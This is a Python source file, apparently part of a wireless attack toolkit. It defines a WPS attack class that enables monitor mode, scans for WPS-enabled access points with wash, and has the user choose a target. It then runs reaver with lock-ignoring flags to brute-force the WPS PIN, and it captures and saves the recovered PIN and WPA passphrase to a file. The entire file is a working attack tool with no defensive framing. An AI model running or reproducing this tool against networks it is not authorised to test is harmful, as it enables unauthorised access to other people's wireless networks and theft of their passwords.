#!/usr/bin/env python3

from rich.console import Console
from rich.table import Table
from rich.progress import Progress
import subprocess
import threading
import time
import signal
import os
import re
from modules.utils import (
    check_wireless_tools,
    get_interface,
    setup_monitor_mode,
    scan_networks,
    select_target,
    get_data_path,
    log_activity,
    get_temp_path,
    cleanup_temp_files
)
from datetime import datetime
from scapy.all import *
from threading import Thread

class WPSAttacker:
    def __init__(self):
        self.console = Console()
        self.interface = None
        self.target_bssid = None
        self.target_essid = None
        self.target_channel = None
        self.running = False
        self.pin_found = False
        self.current_pin = None
        self.status_thread = None
        self.start_time = None
        self.pins_tested = 0
        self.attack_process = None

    def cleanup(self):
        """Clean up resources and restore interface state"""
        try:
            self.running = False
            if self.status_thread and self.status_thread.is_alive():
                self.status_thread.join(timeout=1)
            if self.attack_process:
                self.attack_process.terminate()
                time.sleep(1)
            if self.interface:
                subprocess.run(['airmon-ng', 'stop', self.interface], 
                             stdout=subprocess.DEVNULL, 
                             stderr=subprocess.DEVNULL)
        except Exception as e:
            self.console.print(f"[red]Error during cleanup: {str(e)}[/red]")

    def scan_networks(self):
        """Scan for networks with WPS enabled"""
        try:
            networks = []
            temp_file = get_temp_path('wps_scan')
            
            # Start wash scan
            scan_process = subprocess.Popen(
                ['wash', '-i', self.interface],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Show progress while scanning
            with Progress() as progress:
                task = progress.add_task("[cyan]Scanning for WPS-enabled networks...", total=100)
                
                for i in range(20):  # Scan for 20 seconds
                    progress.update(task, advance=5)
                    
                    # Read output without blocking
                    while True:
                        line = scan_process.stdout.readline()
                        if not line:
                            break
                            
                        if '|' in line:  # Valid network line
                            parts = line.strip().split('|')
                            if len(parts) >= 5:
                                bssid = parts[0].strip()
                                channel = parts[1].strip()
                                wps_version = parts[2].strip()
                                wps_locked = parts[3].strip()
                                essid = parts[4].strip()
                                
                                if bssid and essid:
                                    networks.append({
                                        'BSSID': bssid,
                                        'Channel': channel,
                                        'ESSID': essid,
                                        'WPS Version': wps_version,
                                        'WPS Locked': wps_locked == 'Yes'
                                    })
                    
                    time.sleep(1)
                
                scan_process.terminate()
            
            return networks
            
        except Exception as e:
            self.console.print(f"[red]Error during WPS scan: {str(e)}[/red]")
            return []

    def select_target(self, networks):
        """Select target network with improved UI"""
        if not networks:
            self.console.print("[red]No WPS-enabled networks found![/red]")
            return False

        # Display networks
        table = Table(title="WPS-Enabled Networks")
        table.add_column("Index", style="cyan", justify="center")
        table.add_column("BSSID", style="green")
        table.add_column("Channel", justify="center")
        table.add_column("ESSID", style="yellow")
        table.add_column("WPS Version", justify="center")
        table.add_column("Status", style="red")

        for idx, network in enumerate(networks, 1):
            table.add_row(
                str(idx),
                network['BSSID'],
                network['Channel'],
                network['ESSID'],
                network['WPS Version'],
                "Locked" if network['WPS Locked'] else "Unlocked"
            )

        self.console.print(table)

        while True:
            try:
                choice = int(input("\nSelect target network number: ")) - 1
                if 0 <= choice < len(networks):
                    target = networks[choice]
                    if target['WPS Locked']:
                        self.console.print("[yellow]Warning: WPS is locked on this network. Attack may not be successful.[/yellow]")
                        if input("Continue anyway? (y/n): ").lower() != 'y':
                            return False
                    self.target_bssid = target['BSSID']
                    self.target_channel = target['Channel']
                    self.target_essid = target['ESSID']
                    return True
            except ValueError:
                pass
            self.console.print("[red]Invalid choice. Please try again.[/red]")

        return False

    def display_status(self):
        """Display attack status with improved metrics"""
        while self.running:
            try:
                elapsed = time.time() - self.start_time
                rate = self.pins_tested / elapsed if elapsed > 0 else 0
                
                self.console.clear()
                self.console.print("\n[bold cyan]WPS Attack Status:[/bold cyan]")
                self.console.print(f"Target BSSID: {self.target_bssid}")
                self.console.print(f"Target ESSID: {self.target_essid}")
                self.console.print(f"Channel: {self.target_channel}")
                if self.current_pin:
                    self.console.print(f"Current PIN: {self.current_pin}")
                self.console.print(f"PINs Tested: {self.pins_tested}")
                self.console.print(f"Duration: {int(elapsed)}s")
                self.console.print(f"Rate: {rate:.2f} PINs/min")
                self.console.print("\n[yellow]Press Ctrl+C to stop[/yellow]")
                
                time.sleep(1)
            except:
                break

    def parse_reaver_output(self, line):
        """Parse reaver output for status updates"""
        try:
            # Check for PIN attempts
            pin_match = re.search(r'Trying PIN \"(\d+)\"', line)
            if pin_match:
                self.current_pin = pin_match.group(1)
                self.pins_tested += 1
                return

            # Check for successful PIN
            if "WPS PIN:" in line:
                pin = re.search(r'WPS PIN: (\d+)', line)
                if pin:
                    self.pin_found = True
                    self.current_pin = pin.group(1)
                    return

            # Check for WPA PSK
            if "WPA PSK:" in line:
                psk = re.search(r'WPA PSK: \'(.+?)\'', line)
                if psk:
                    self.psk_found = True
                    self.psk = psk.group(1)
                    return

        except Exception as e:
            self.console.print(f"[red]Error parsing output: {str(e)}[/red]")

    def start_attack(self):
        """Start WPS attack"""
        try:
            # Check requirements
            if not check_wireless_tools():
                return

            # Get wireless interface
            self.interface = get_interface()
            if not self.interface:
                return

            # Enable monitor mode
            self.console.print("\n[yellow]Enabling monitor mode...[/yellow]")
            self.interface = setup_monitor_mode(self.interface)
            if not self.interface:
                self.console.print("[red]Failed to enable monitor mode![/red]")
                return

            self.console.print("[green]Monitor mode enabled successfully![/green]")

            # Scan for WPS networks
            self.console.print("\n[yellow]Scanning for WPS-enabled networks...[/yellow]")
            networks = self.scan_networks()

            # Select target
            if not self.select_target(networks):
                return

            # Start attack
            self.console.print("\n[yellow]Starting WPS attack...[/yellow]")
            self.console.print("[cyan]Press Ctrl+C to stop[/cyan]")

            self.running = True
            self.start_time = time.time()

            # Start status display thread
            self.status_thread = Thread(target=self.display_status)
            self.status_thread.daemon = True
            self.status_thread.start()

            # Start reaver attack
            cmd = [
                'reaver',
                '-i', self.interface,
                '-b', self.target_bssid,
                '-c', self.target_channel,
                '-vv',  # Verbose output
                '-L',   # Ignore locked state
                '-N',   # Don't send NACK messages
                '-d', '2',  # Delay between attempts
                '-T', '1',  # 1 second timeout
                '-r', '3:15'  # 3 retries, 15 second delay
            ]

            self.attack_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True,
                bufsize=1
            )

            # Monitor attack progress
            try:
                while self.running and self.attack_process.poll() is None:
                    line = self.attack_process.stdout.readline()
                    if line:
                        self.parse_reaver_output(line)
                        if self.pin_found:
                            break
            except KeyboardInterrupt:
                self.running = False

            # Save results
            if self.pin_found:
                self.console.print(f"\n[green]WPS PIN found: {self.current_pin}[/green]")
                if hasattr(self, 'psk_found') and self.psk_found:
                    self.console.print(f"[green]WPA PSK: {self.psk}[/green]")

                # Save to file
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                save_path = get_data_path('wps', f'wps_{timestamp}.txt')

                with open(save_path, 'w') as f:
                    f.write(f"WPS Attack Results\n")
                    f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"Target AP: {self.target_bssid}\n")
                    f.write(f"Target ESSID: {self.target_essid}\n")
                    f.write(f"WPS PIN: {self.current_pin}\n")
                    if hasattr(self, 'psk_found') and self.psk_found:
                        f.write(f"WPA PSK: {self.psk}\n")
                    f.write(f"Duration: {int(time.time() - self.start_time)} seconds\n")
                    f.write(f"PINs Tested: {self.pins_tested}\n")

                self.console.print(f"\n[green]Results saved to: {save_path}[/green]")
                log_activity(f"WPS attack successful - Target: {self.target_essid}")
            else:
                self.console.print("\n[yellow]Attack completed without finding PIN[/yellow]")
                log_activity(f"WPS attack failed - Target: {self.target_essid}")

        except Exception as e:
            self.console.print(f"[red]Error during attack: {str(e)}[/red]")

        finally:
            self.cleanup()
            input("\nPress Enter to continue...") 
            input("\nPress Enter to continue...") 